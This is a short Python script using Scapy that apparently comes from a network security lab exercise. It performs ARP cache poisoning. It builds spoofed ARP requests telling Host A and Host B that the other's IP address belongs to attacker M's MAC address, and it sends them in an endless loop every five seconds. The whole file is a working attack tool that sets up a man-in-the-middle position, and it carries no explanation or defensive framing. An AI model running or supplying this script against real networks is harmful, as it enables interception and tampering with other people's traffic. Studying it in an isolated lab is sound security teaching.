#!/usr/bin/python3

from scapy.all import *

A_IP = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"

B_IP = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"

M_IP = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

# 1-----constructing the Ether header to spoof ARP request to Host A-----
#print("seinding spoofed M-mac announcement to all devices in the subnet.......")
ether_1 = Ether()
ether_1.dst = A_mac
ether_1.src = M_mac #spoofed mac adress
#constructing the arp packet-- called as payload
arp_1 = ARP()
arp_1.hwsrc = M_mac
arp_1.psrc = B_IP
arp_1.pdst = A_IP
arp_1.op = 1
#building the frame to send apr request
frame_1 = ether_1/arp_1


# 2-----constructing the Ether header to spoof ARP request to Host B-----
#print("seinding spoofed M-mac announcement to all devices in the subnet.......")
ether_2 = Ether()
ether_2.dst = B_mac
ether_2.src = M_mac #spoofed mac adress
#constructing the arp packet
arp_2 = ARP()
arp_2.hwsrc = M_mac
arp_2.psrc = A_IP
arp_2.pdst = B_IP
arp_2.op = 1
#building the frame to send apr request
frame_2 = ether_2/arp_2


#sending the apr request
while(True):
    print("sending spoofed ARP requests to Hosts A and Hosts B...")
    sendp(frame_1)#, iface = "br-ed78dd7aeec1")
    sendp(frame_2)#, iface = "br-ed78dd7aeec1")
    time.sleep(5)
